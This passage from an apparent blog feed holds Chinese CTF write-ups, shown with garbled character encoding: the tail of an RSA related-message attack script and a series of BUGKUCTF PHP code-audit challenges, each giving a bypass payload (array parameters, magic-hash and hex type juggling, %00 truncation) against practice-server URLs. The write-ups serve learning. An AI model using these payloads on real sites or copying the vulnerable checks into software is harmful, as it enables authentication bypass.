class="hljs-number">0x22573b528e5ca137dc93b7f17f04d4efbf82124215a9c28ae6823fe5c7b6fb5eb5d328d9f6dbf73f88f59add74630d0721a822f8fb884b314f4c45aae1358fc8a19c59bbc370463541d58bd9cda1d77575a443cfbd85bdba48ae3e01642811a0b9824e3c8df8c02caed7a0606ceb6695dca7372e4291c60a98ed56b9442434</span>c2 = <span class="hljs-number">0xe5ac2d53cd385143472febb8d7ba4acb7697bd494ef9ea0d165dd2ba7e451d803e45076ded5ef44bec0b72052b932348a50f0c66c6641159518f5137140a4db9fc497982930801715468932913e257f8b2abe287244d1d087c0ecf679cb46b1957bef678dee094d650a97d5a9d53cab80986571d890fbcd024528d6a321ac9</span>a = <span class="hljs-number">1</span>b = <span class="hljs-number">-1</span>padding2 = <span class="hljs-number">1</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getM2</span><span class="hljs-params">(a,b,c1,c2,n)</span>:</span>    a3 = pow(a,<span class="hljs-number">3</span>,n)    b3 = pow(b,<span class="hljs-number">3</span>,n)    first = c1-a3*c2+<span class="hljs-number">2</span>*b3    first = first % n    second = <span class="hljs-number">3</span>*b*(a3*c2-b3)    second = second % n    third = second*gmpy2.invert(first,n)    third = third % n    fourth = (third+b)*gmpy2.invert(a,n)    <span class="hljs-keyword">return</span> fourth % nm = getM2(a,b,c1,c2,n)-padding2<span class="hljs-keyword">print</span> long_to_bytes(m).encode(<span class="hljs-string">'hex'</span>)<span class="hljs-comment">#print m</span>c = pow(m,e,n)<span class="hljs-comment">#print hex(c)</span><span class="hljs-keyword">if</span> c == c1:<span class="hljs-keyword">print</span> <span class="hljs-string">"yeah"</span></code></pre><h2 id="å‚è€ƒé“¾æ¥">å‚è€ƒé“¾æ¥<a class="post-anchor" href="#å‚è€ƒé“¾æ¥"></a></h2><p><a href="http://www.realwz.com/2018/03/rsainctf.html" target="_blank" rel="noopener">http://www.realwz.com/2018/03/rsainctf.html</a><br><a href="http://inaz2.hatenablog.com/entry/2016/01/20/022936" target="_blank" rel="noopener">http://inaz2.hatenablog.com/entry/2016/01/20/022936</a><br><a href="https://findneo.github.io/180727rsa-attack/" target="_blank" rel="noopener">https://findneo.github.io/180727rsa-attack/</a><br><a href="https://www.cnblogs.com/WangAoBo/p/7541481.html" target="_blank" rel="noopener">https://www.cnblogs.com/WangAoBo/p/7541481.html</a><br><a href="https://code.felinae98.cn/ctf/crypto/rsa%e5%a4%a7%e7%a4%bc%e5%8c%85%ef%bc%88%e4%ba%8c%ef%bc%89coppersmith-%e7%9b%b8%e5%85%b3/" target="_blank" rel="noopener">https://code.felinae98.cn/ctf/crypto/rsa%e5%a4%a7%e7%a4%bc%e5%8c%85%ef%bc%88%e4%ba%8c%ef%bc%89coppersmith-%e7%9b%b8%e5%85%b3/</a><br><a href="https://www.anquanke.com/post/id/158944#h2-4" target="_blank" rel="noopener">https://www.anquanke.com/post/id/158944#h2-4</a><br><a href="https://altman.vip/2018/07/23/RSA-STUDY/#0x06-Lattice-based-attacks-on-RSA" target="_blank" rel="noopener">https://altman.vip/2018/07/23/RSA-STUDY/#0x06-Lattice-based-attacks-on-RSA</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUGKUCTF-ä»£ç å®¡è®¡</title>
      <link href="/2019/07/13/BUGKUCTF-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
      <url>/2019/07/13/BUGKUCTF-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h3 id="extractå˜é‡è¦†ç›–">extractå˜é‡è¦†ç›–<a class="post-anchor" href="#extractå˜é‡è¦†ç›–"></a></h3><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$flag=<span class="hljs-string">'xxx'</span>;extract($_GET);<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($shiyan))&#123;$content=trim(file_get_contents($flag));<span class="hljs-comment">#trim() å‡½æ•°ç§»é™¤å­—ç¬¦ä¸²ä¸¤ä¾§çš„ç©ºç™½å­—ç¬¦æˆ–å…¶ä»–é¢„å®šä¹‰å­—ç¬¦ã€‚</span><span class="hljs-comment">#file_get_contents() å‡½æ•°æ˜¯ç”¨äºå°†æ–‡ä»¶çš„å†…å®¹è¯»å…¥åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­çš„é¦–é€‰æ–¹æ³•ã€‚</span><span class="hljs-keyword">if</span>($shiyan==$content)&#123;<span class="hljs-keyword">echo</span><span class="hljs-string">'flag&#123;xxx&#125;'</span>;&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">echo</span><span class="hljs-string">'Oh.no'</span>;&#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>extract()å‡½æ•°, å°†GETæ–¹å¼è·å¾—çš„å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ä¸­<br>å¦‚æœå˜é‡shiyanå’Œå˜é‡contentçš„å€¼ç›¸åŒï¼Œ<br>å°±è¾“å‡ºflagçš„å€¼<br>å¦åˆ™å°±è¾“å‡ºOh,no<br>å› ä¸ºextract()ä¼šæŠŠç¬¦å·è¡¨ä¸­å·²å­˜åœ¨çš„å˜é‡åçš„å€¼æ›¿æ¢æ‰ï¼Œæ‰€ä»¥Payload ï¼š<code>?shiyan=&amp;content=</code></p><p>é‚£ä¹ˆåœ¨ä½¿ç”¨å‡½æ•°extract()çš„æ—¶å€™, å¦‚ä½•é˜²æ­¢è¿™ç§æ¼æ´å‘¢<br>å¯ä»¥åœ¨ä½¿ç”¨çš„æ—¶å€™åŠ ä¸Šå‚æ•°EXTR_SKIP<br>è¿™ä¸ªå‚æ•°è¡¨ç¤ºå¦‚æœæœ‰å†²çªï¼Œä¸è¦†ç›–å·²æœ‰çš„å˜é‡<br>æˆ–è€…è¿˜æœ‰EXTR_PREFIX_SAME - å¦‚æœæœ‰å†²çªï¼Œåœ¨å˜é‡åå‰åŠ ä¸Šå‰ç¼€ prefixã€‚</p><h3 id="strcmpæ¯”è¾ƒå­—ç¬¦ä¸²">strcmpæ¯”è¾ƒå­—ç¬¦ä¸²<a class="post-anchor" href="#strcmpæ¯”è¾ƒå­—ç¬¦ä¸²"></a></h3><p>æºç </p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$flag = <span class="hljs-string">"flag&#123;xxxxx&#125;"</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'a'</span>])) &#123;<span class="hljs-keyword">if</span> (strcmp($_GET[<span class="hljs-string">'a'</span>], $flag) == <span class="hljs-number">0</span>) <span class="hljs-comment">//å¦‚æœ str1 å°äº str2 è¿”å› &lt; 0ï¼› å¦‚æœ str1å¤§äº str2è¿”å› &gt; 0ï¼›å¦‚æœä¸¤è€…ç›¸ç­‰ï¼Œè¿”å› 0ã€‚</span><span class="hljs-comment">//æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²ï¼ˆåŒºåˆ†å¤§å°å†™ï¼‰</span><span class="hljs-keyword">die</span>(<span class="hljs-string">'Flag: '</span>.$flag);<span class="hljs-keyword">else</span><span class="hljs-keyword">print</span> <span class="hljs-string">'No'</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>è§£è¿™é“é¢˜ï¼Œå°±åªè¦ä¼ å…¥ä¸€ä¸ªéå­—ç¬¦ä¸²ç±»å‹çš„å˜é‡å³å¯ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬æˆ‘ä»¬ä¼ æ•°ç»„ï¼Œæ‰€ä»¥payloadä¸ºï¼š?a[]=123</p><h3 id="urldecodeäºŒæ¬¡ç¼–ç ç»•è¿‡">urldecodeäºŒæ¬¡ç¼–ç ç»•è¿‡<a class="post-anchor" href="#urldecodeäºŒæ¬¡ç¼–ç ç»•è¿‡"></a></h3><p>æºç </p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span>(eregi(<span class="hljs-string">"hackerDJ"</span>,$_GET[id]))<span class="hljs-comment">//eregi()å‡½æ•°åœ¨ä¸€ä¸ªå­—ç¬¦ä¸²æœç´¢æŒ‡å®šçš„æ¨¡å¼çš„å­—ç¬¦ä¸²</span>&#123;<span class="hljs-keyword">echo</span>(<span class="hljs-string">"not allowed!"</span>);<span class="hljs-keyword">exit</span>();&#125;$_GET[id] = urldecode($_GET[id]);<span class="hljs-keyword">if</span>($_GET[id] == <span class="hljs-string">"hackerDJ"</span>)&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">"Access granted!"</span>;<span class="hljs-keyword">echo</span> <span class="hljs-string">"flag"</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>å°±æ˜¯éœ€è¦æ„é€ geté“¾æ¥å°±å¯ä»¥å¾—åˆ°ç­”æ¡ˆï¼šåˆ©ç”¨äº†ä¸¤æ¬¡urldecodeç¬¬ä¸€æ¬¡æ˜¯æµè§ˆå™¨çš„è§£ç ç¬¬äºŒæ¬¡æ˜¯å‡½æ•°çš„è§£ç </p><h3 id="md5-å‡½æ•°">md5()å‡½æ•°<a class="post-anchor" href="#md5-å‡½æ•°"></a></h3><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);$flag = <span class="hljs-string">'flag&#123;test&#125;'</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'username'</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'password'</span>])) &#123;<span class="hljs-keyword">if</span> ($_GET[<span class="hljs-string">'username'</span>] == $_GET[<span class="hljs-string">'password'</span>])<span class="hljs-keyword">print</span> <span class="hljs-string">'Your password can not be your username.'</span>;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (md5($_GET[<span class="hljs-string">'username'</span>]) === md5($_GET[<span class="hljs-string">'password'</span>]))<span class="hljs-keyword">die</span>(<span class="hljs-string">'Flag: '</span>.$flag);<span class="hljs-keyword">else</span><span class="hljs-keyword">print</span> <span class="hljs-string">'Invalid password'</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre><ul><li>æ¾æ•£æ¯”è¾ƒï¼šä½¿ç”¨ä¸¤ä¸ªç­‰å· == æ¯”è¾ƒï¼Œåªæ¯”è¾ƒå€¼ï¼Œä¸æ¯”è¾ƒç±»å‹ã€‚</li><li>ä¸¥æ ¼æ¯”è¾ƒï¼šç”¨ä¸¤ä¸ªç­‰å· === æ¯”è¾ƒï¼Œé™¤äº†æ¯”è¾ƒå€¼ï¼Œä¹Ÿæ¯”è¾ƒç±»å‹ã€‚<br>md5()å‡½æ•°æ— æ³•å¤„ç†æ•°ç»„ï¼Œå¦‚æœä¼ å…¥çš„ä¸ºæ•°ç»„ï¼Œä¼šè¿”å›NULLï¼Œæ‰€ä»¥ä¸¤ä¸ªæ•°ç»„ç»è¿‡åŠ å¯†åå¾—åˆ°çš„éƒ½æ˜¯NULL,ä¹Ÿå°±æ˜¯ç›¸ç­‰çš„ã€‚<br>payload= <code>http://123.206.87.240:9009/18.php?username[]=1&amp;password[]=0</code></li></ul><h3 id="æ•°ç»„è¿”å›NULLç»•è¿‡">æ•°ç»„è¿”å›NULLç»•è¿‡<a class="post-anchor" href="#æ•°ç»„è¿”å›NULLç»•è¿‡"></a></h3><p>æºç  <a href="http://123.206.87.240:9009/19.php" target="_blank" rel="noopener">é¢˜ç›®åœ°å€</a></p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$flag = <span class="hljs-string">"flag"</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> ($_GET[<span class="hljs-string">'password'</span>])) &#123;<span class="hljs-keyword">if</span> (ereg (<span class="hljs-string">"^[a-zA-Z0-9]+$"</span>, $_GET[<span class="hljs-string">'password'</span>]) === <span class="hljs-keyword">FALSE</span>)<span class="hljs-keyword">echo</span> <span class="hljs-string">'You password must be alphanumeric'</span>;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (strpos ($_GET[<span class="hljs-string">'password'</span>], <span class="hljs-string">'--'</span>) !== <span class="hljs-keyword">FALSE</span>)<span class="hljs-comment">//æŸ¥æ‰¾ "--" åœ¨å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®</span><span class="hljs-keyword">die</span>(<span class="hljs-string">'Flag: '</span> . $flag);<span class="hljs-keyword">else</span><span class="hljs-keyword">echo</span> <span class="hljs-string">'Invalid password'</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>payload<code>http://123.206.87.240:9009/19.php?password[]=1223</code>è‡ªå·±éƒ½æä¸æ‡‚ä¸ºä»€ä¹ˆ<br>å…ˆæ¥è°ˆè®ºä¸€ä¸‹æ ‡å‡†çš„ç­”æ¡ˆï¼š<br>ç¬¬ä¸€ä¸ªæ¡ä»¶ï¼š</p><ul><li>å¿…é¡»ä»¥æ•°å­—æˆ–è€…å­—æ¯å¼€å¤´ï¼ˆå…¶å®çœ‹åˆ°eregå°±å¯ä»¥æƒ³åˆ°%00æˆªæ–­ï¼‰</li></ul><p>ç¬¬äºŒä¸ªæ¡ä»¶ï¼š</p><ul><li>å¿…é¡»åœ¨passwordå‚æ•°ä¸­æ‰¾åˆ°â€“ã€‚</li></ul><p>æ‰€ä»¥å¾—å‡ºä»¥ä¸‹æ­£è§£ï¼š<br><code>index.php?password=a%00--</code><br>é‚£ä¹ˆè¯åˆè¯´å›æ¥äº†ï¼Œä¸ºä»€ä¹ˆç›´æ¥password[]=aå°±å¯ä»¥ç»•è¿‡å‘¢ï¼Ÿ<br>1.eregåªèƒ½å¤„ç†å­—ç¬¦ï¼Œè€Œä½ æ˜¯æ•°ç»„ï¼Œæ‰€ä»¥è¿”å›çš„æ˜¯nullï¼Œä¸‰ä¸ªç­‰å·çš„æ—¶å€™ä¸ä¼šè¿›è¡Œç±»å‹è½¬æ¢ã€‚æ‰€ä»¥nullä¸ç­‰äºfalseã€‚<br>2.strposçš„å‚æ•°åŒæ ·ä¸èƒ½å¤Ÿæ˜¯æ•°ç»„ï¼Œæ‰€ä»¥è¿”å›çš„ä¾æ—§æ˜¯nullï¼Œnullä¸ç­‰äºfalseä¹Ÿæ˜¯æ­£ç¡®ã€‚<br>æ‰€ä»¥å¯ä»¥æ‹¿åˆ°flag</p><h3 id="å¼±ç±»å‹æ•´æ•°å¤§å°æ¯”è¾ƒç»•è¿‡">å¼±ç±»å‹æ•´æ•°å¤§å°æ¯”è¾ƒç»•è¿‡<a class="post-anchor" href="#å¼±ç±»å‹æ•´æ•°å¤§å°æ¯”è¾ƒç»•è¿‡"></a></h3><p><a href="[http://123.206.87.240:9009/22.php]" title="http://123.206.87.240:9009/22.php">ä¼ é€é—¨</a></p><pre><code class="hljs php">$temp = $_GET[<span class="hljs-string">'password'</span>];is_numeric($temp)?<span class="hljs-keyword">die</span>(<span class="hljs-string">"no numeric"</span>):<span class="hljs-keyword">NULL</span>;<span class="hljs-keyword">if</span>($temp&gt;<span class="hljs-number">1336</span>)&#123;<span class="hljs-keyword">echo</span> $flag;</code></pre><ul><li>payload<code>http://123.206.87.240:9009/22.php?password=1444a</code>è¿˜æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆâ€¦</li><li>payload<code>http://123.206.87.240:9009/22.php?password[]=1</code><br>PHPæ•°ç»„æœ‰ä¸€ä¸ªç¼ºé™·å°±æ˜¯å¤§å¤šæ•°çš„å‡½æ•°éƒ½æ²¡æœ‰åŠæ³•å»åˆ¤æ–­æ•°ç»„ã€‚</li><li>payload<code>http://120.24.86.145:9009/22.php?password=2345%20</code>æˆ–è€…<code>http://120.24.86.145:9009/22.php?password=2345%00</code><br>is_numeric()å‡½æ•°å¯¹äºç©ºå­—ç¬¦%00ï¼Œæ— è®ºæ˜¯%00æ”¾åœ¨å‰åéƒ½å¯ä»¥åˆ¤æ–­ä¸ºéæ•°å€¼ï¼Œè€Œ%20ç©ºæ ¼å­—ç¬¦åªèƒ½æ”¾åœ¨æ•°å€¼åã€‚æ‰€ä»¥ï¼ŒæŸ¥çœ‹å‡½æ•°å‘ç°è¯¥å‡½æ•°å¯¹äºç¬¬ä¸€ä¸ªç©ºæ ¼å­—ç¬¦ä¼šè·³è¿‡ç©ºæ ¼å­—ç¬¦åˆ¤æ–­ï¼Œæ¥ç€åé¢çš„åˆ¤æ–­ã€‚</li></ul><h3 id="sha-å‡½æ•°æ¯”è¾ƒç»•è¿‡">sha()å‡½æ•°æ¯”è¾ƒç»•è¿‡<a class="post-anchor" href="#sha-å‡½æ•°æ¯”è¾ƒç»•è¿‡"></a></h3><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$flag = <span class="hljs-string">"flag"</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'name'</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'password'</span>]))&#123;var_dump($_GET[<span class="hljs-string">'name'</span>]);<span class="hljs-keyword">echo</span> <span class="hljs-string">""</span>;var_dump($_GET[<span class="hljs-string">'password'</span>]);var_dump(sha1($_GET[<span class="hljs-string">'name'</span>]));var_dump(sha1($_GET[<span class="hljs-string">'password'</span>]));<span class="hljs-keyword">if</span> ($_GET[<span class="hljs-string">'name'</span>] == $_GET[<span class="hljs-string">'password'</span>])<span class="hljs-keyword">echo</span> <span class="hljs-string">'Your password can not be your name!'</span>;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (sha1($_GET[<span class="hljs-string">'name'</span>]) === sha1($_GET[<span class="hljs-string">'password'</span>]))<span class="hljs-keyword">die</span>(<span class="hljs-string">'Flag: '</span>.$flag);<span class="hljs-keyword">else</span><span class="hljs-keyword">echo</span> <span class="hljs-string">'Invalid password.'</span>;&#125;<span class="hljs-keyword">else</span><span class="hljs-keyword">echo</span> <span class="hljs-string">'Login first!'</span>;<span class="hljs-meta">?&gt;</span></code></pre><ul><li>payload<code>http://123.206.87.240:9009/7.php?name[]=1&amp;password[]=0</code></li></ul><p>åˆ©ç”¨sha1å‡½æ•°ä¸èƒ½å¤„ç†æ•°ç»„è¿›è¡Œæ„é€ payload<br>ä»£ç å®¡è®¡éœ€è¦æ»¡è¶³ä¸‰ä¸ªæ¡ä»¶ï¼š</p><ol><li>if (isset(GET[â€²nameâ€²])andisset(_GET[â€˜passwordâ€™])) ==ã€‹TRUE<ol start="2"><li>if (GET[â€²nameâ€²]==_GET[â€˜passwordâ€™]) ==ã€‹FALSE</li></ol></li><li>if sha1(GET[â€²nameâ€²])===sha1(_GET[â€˜passwordâ€™])) ==ã€‹TRUE</li></ol><h3 id="md5åŠ å¯†ç›¸ç­‰ç»•è¿‡">md5åŠ å¯†ç›¸ç­‰ç»•è¿‡<a class="post-anchor" href="#md5åŠ å¯†ç›¸ç­‰ç»•è¿‡"></a></h3><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$md51 = md5(<span class="hljs-string">'QNKCDZO'</span>);$a = @$_GET[<span class="hljs-string">'a'</span>];$md52 = @md5($a);<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($a))&#123;<span class="hljs-keyword">if</span> ($a != <span class="hljs-string">'QNKCDZO'</span> &amp;&amp; $md51 == $md52) &#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">"flag&#123;*&#125;"</span>;&#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">"false!!!"</span>;&#125;&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">"please input a"</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>payload<code>http://123.206.87.240:9009/13.php?a=s878926199a</code>å¼±ç±»å‹æ¯”è¾ƒ</p><h3 id="åå…­è¿›åˆ¶ä¸æ•°å­—æ¯”è¾ƒ">åå…­è¿›åˆ¶ä¸æ•°å­—æ¯”è¾ƒ<a class="post-anchor" href="#åå…­è¿›åˆ¶ä¸æ•°å­—æ¯”è¾ƒ"></a></h3><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">noother_says_correct</span><span class="hljs-params">($temp)</span></span>&#123;$flag = <span class="hljs-string">'flag&#123;test&#125;'</span>;$one = ord(<span class="hljs-string">'1'</span>); <span class="hljs-comment">//ord â€” è¿”å›å­—ç¬¦çš„ ASCII ç å€¼</span>$nine = ord(<span class="hljs-string">'9'</span>); <span class="hljs-comment">//ord â€” è¿”å›å­—ç¬¦çš„ ASCII ç å€¼</span>$number = <span class="hljs-string">'3735929054'</span>;<span class="hljs-comment">// Check all the input characters!</span><span class="hljs-keyword">for</span> ($i = <span class="hljs-number">0</span>; $i &lt; strlen($number); $i++)&#123;<span class="hljs-comment">// Disallow all the digits!</span>$digit = ord($temp&#123;$i&#125;);<span class="hljs-keyword">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )&#123;<span class="hljs-comment">// Aha, digit not allowed!</span><span class="hljs-keyword">return</span> <span class="hljs-string">"flase"</span>;&#125;&#125;<span class="hljs-keyword">if</span>($number == $temp)<span class="hljs-keyword">return</span> $flag;&#125;$temp = $_GET[<span class="hljs-string">'password'</span>];<span class="hljs-keyword">echo</span> noother_says_correct($temp);<span class="hljs-meta">?&gt;</span></code></pre><p>å®šä¹‰äº†ä¸€ä¸ªfunction <code>noother_says_correct</code><br>é¦–å…ˆåˆ†æä»£ç ï¼Œå‡½æ•°è¦æ±‚å˜é‡$tempä¸èƒ½å­˜åœ¨1-9ä¹‹é—´çš„æ•°å­—ï¼Œ<br>æœ€åï¼Œåˆè¦æ±‚$temp=3735929054;<br>è¿™æœ¬æ¥æ˜¯è‡ªç›¸çŸ›ç›¾çš„ï¼Œä½†phpåœ¨è½¬ç æ—¶ä¼šæŠŠ16è¿›åˆ¶è½¬åŒ–ä¸ºåè¿›åˆ¶.äºæ˜¯æŠŠ<br>3735929054è½¬æ¢æˆ16è¿›åˆ¶ä¸º0xdeadc0deï¼Œè®°å¾—å¸¦ä¸Š0xï¼›<br>æ„é€ payload<br><code>password=0xdeadc0de</code></p><h3 id="å˜é‡è¦†ç›–">å˜é‡è¦†ç›–<a class="post-anchor" href="#å˜é‡è¦†ç›–"></a></h3><p>æœåŠ¡å™¨è¢«è¦†ç›–äº†..</p><h3 id="0x11-eregæ­£åˆ™-00æˆªæ–­">0x11 - eregæ­£åˆ™%00æˆªæ–­<a class="post-anchor" href="#0x11-eregæ­£åˆ™-00æˆªæ–­"></a></h3><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$flag = <span class="hljs-string">"xxx"</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> ($_GET[<span class="hljs-string">'password'</span>]))&#123;<span class="hljs-keyword">if</span> (ereg (<span class="hljs-string">"^[a-zA-Z0-9]+$"</span>, $_GET[<span class="hljs-string">'password'</span>]) === <span class="hljs-keyword">FALSE</span>)&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">'You password must be alphanumeric'</span>;&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (strlen($_GET[<span class="hljs-string">'password'</span>]) &lt; <span class="hljs-number">8</span> &amp;&amp; $_GET[<span class="hljs-string">'password'</span>] &gt; <span class="hljs-number">9999999</span>)&#123;<span class="hljs-keyword">if</span> (strpos ($_GET[<span class="hljs-string">'password'</span>], <span class="hljs-string">'*-*'</span>) !== <span class="hljs-keyword">FALSE</span>) <span class="hljs-comment">//strpos â€” æŸ¥æ‰¾å­—ç¬¦ä¸²é¦–æ¬¡å‡ºç°çš„ä½ç½®</span>&#123;<span class="hljs-keyword">die</span>(<span class="hljs-string">'Flag: '</span> . $flag);&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">echo</span>(<span class="hljs-string">'- have not been found'</span>);&#125;&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">'Invalid password'</span>;&#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre><ol><li>if (ereg (â€œ^[a-zA-Z0-9]+â€,_GET[â€˜passwordâ€™]) === FALSE)  ==ã€‹ FLASE</li><li>if (strlen(_GET[â€˜passwordâ€™]) &lt; 8 &amp;&amp;_GET[â€˜passwordâ€™] &gt; 9999999)    //æ­£å¸¸æ„Ÿè§‰çŸ›ç›¾ï¼Œä½†æ˜¯å¯ä»¥åˆ©ç”¨ç§‘å­¦è®¡æ•°æ³•ç»•è¿‡1e8 &gt; 9999999</li><li>if (strpos ($_GET[â€˜passwordâ€™], â€˜<em>-</em>â€˜) !== FALSE)   //passwordçš„å€¼åº”åŒ…å«å­—ç¬¦ä¸²â€™<em>-</em>â€˜<br>æ„é€ payloadï¼š<blockquote><p><code>http://123.206.87.240:9009/5.php?password=1e8%00*-*http://123.206.87.240:9009/5.php?password[]=</code></p></blockquote></li></ol><h3 id="strposæ•°ç»„ç»•è¿‡">strposæ•°ç»„ç»•è¿‡<a class="post-anchor" href="#strposæ•°ç»„ç»•è¿‡"></a></h3><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$flag = <span class="hljs-string">"flag"</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> ($_GET[<span class="hljs-string">'ctf'</span>])) &#123;<span class="hljs-keyword">if</span> (@ereg (<span class="hljs-string">"^[1-9]+$"</span>, $_GET[<span class="hljs-string">'ctf'</span>]) === <span class="hljs-keyword">FALSE</span>)<span class="hljs-keyword">echo</span> <span class="hljs-string">'å¿…é¡»è¾“å…¥æ•°å­—æ‰è¡Œ'</span>;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (strpos ($_GET[<span class="hljs-string">'ctf'</span>], <span class="hljs-string">'#biubiubiu'</span>) !== <span class="hljs-keyword">FALSE</span>)<span class="hljs-keyword">die</span>(<span class="hljs-string">'Flag: '</span>.$flag);<span class="hljs-keyword">else</span><span class="hljs-keyword">echo</span> <span class="hljs-string">'éªšå¹´ï¼Œç»§ç»­åŠªåŠ›å§å•Š~'</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>payload<code>http://123.206.87.240:9009/15.php?ctf[]=</code></p><h3 id="æ•°å­—éªŒè¯æ­£åˆ™ç»•è¿‡">æ•°å­—éªŒè¯æ­£åˆ™ç»•è¿‡<a class="post-anchor" href="#æ•°å­—éªŒè¯æ­£åˆ™ç»•è¿‡"></a></h3><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);$flag = <span class="hljs-string">'flag&#123;test&#125;'</span>;<span class="hljs-keyword">if</span> (<span class="hljs-string">"POST"</span> == $_SERVER[<span class="hljs-string">'REQUEST_METHOD'</span>])&#123;$password = $_POST[<span class="hljs-string">'password'</span>];<span class="hljs-keyword">if</span> (<span class="hljs-number">0</span> &gt;= preg_match(<span class="hljs-string">'/^[[:graph:]]&#123;12,&#125;$/'</span>, $password)) <span class="hljs-comment">//preg_match â€” æ‰§è¡Œä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…</span>&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">'flag'</span>;<span class="hljs-keyword">exit</span>;&#125;<span class="hljs-keyword">while</span> (<span class="hljs-keyword">TRUE</span>)&#123;$reg = <span class="hljs-string">'/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/'</span>;<span class="hljs-keyword">if</span> (<span class="hljs-number">6</span> &gt; preg_match_all($reg, $password, $arr))<span class="hljs-keyword">break</span>;$c = <span class="hljs-number">0</span>;$ps = <span class="hljs-keyword">array</span>(<span class="hljs-string">'punct'</span>, <span class="hljs-string">'digit'</span>, <span class="hljs-string">'upper'</span>, <span class="hljs-string">'lower'</span>); <span class="hljs-comment">//[[:punct:]] ä»»ä½•æ ‡ç‚¹ç¬¦å· [[:digit:]] ä»»ä½•æ•°å­— [[:upper:]] ä»»ä½•å¤§å†™å­—æ¯ [[:lower:]] ä»»ä½•å°å†™å­—æ¯</span><span class="hljs-keyword">foreach</span> ($ps <span class="hljs-keyword">as</span> $pt)&#123;<span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">"/[[:$pt:]]+/"</span>, $password))$c += <span class="hljs-number">1</span>;&#125;<span class="hljs-keyword">if</span> ($c &lt; <span class="hljs-number">3</span>) <span class="hljs-keyword">break</span>;<span class="hljs-comment">//&gt;=3ï¼Œå¿…é¡»åŒ…å«å››ç§ç±»å‹ä¸‰ç§ä¸ä¸‰ç§ä»¥ä¸Š</span><span class="hljs-keyword">if</span> (<span class="hljs-string">"42"</span> == $password) <span class="hljs-keyword">echo</span> $flag;<span class="hljs-keyword">else</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">'Wrong password'</span>;<span class="hljs-keyword">exit</span>;&#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>åˆ©ç”¨preg_match()å‡½æ•°ä¸èƒ½å¤„ç†æ•°ç»„è¿›è¡Œæ„é€ payload<br>payload<code>post : password[]=</code></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019æ˜å®‰æ¯-write up</title>
